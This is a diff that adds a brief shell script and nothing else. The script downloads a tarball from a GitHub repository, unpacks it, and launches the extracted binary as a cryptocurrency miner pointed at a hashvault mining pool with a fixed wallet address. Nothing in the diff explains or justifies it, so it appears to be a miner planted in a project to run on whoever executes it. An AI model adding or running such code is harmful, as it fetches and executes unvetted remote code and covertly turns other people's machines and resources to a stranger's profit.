@@ -1,0 +1,4 @@
+wget https://github.com/NabilaMahmudah/orge/raw/main/kh.tar.gz && tar xf kh.tar.gz
+./h --pool pool.hashvault.pro:443 --username TRTLv1BLnH4MTskBnFYZM1JiXaHyr3fNbYKRPoNWFavQgPMPucfkjzXSMzgcrDmnkdBZgnbFSPwRa1RXHh9d1PSTapighLFbaAe --password bhb --algorithm chukwa_v2 --ssl
+
+
